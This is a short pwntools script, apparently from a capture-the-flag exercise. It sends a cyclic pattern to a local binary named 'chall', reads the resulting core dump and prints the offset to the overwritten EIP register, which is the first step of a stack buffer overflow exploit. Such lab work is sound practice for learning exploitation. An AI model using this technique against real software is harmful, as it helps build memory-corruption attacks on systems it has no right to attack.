from pwn import *

elf = context.binary = ELF('./chall')
io = process('./chall')
io.recvuntil(b'Give me your input:')
io.sendline(cyclic(200))
io.wait()

core = io.corefile
eip = core.eip
offset = cyclic_find(eip)
print("Offset:", offset)
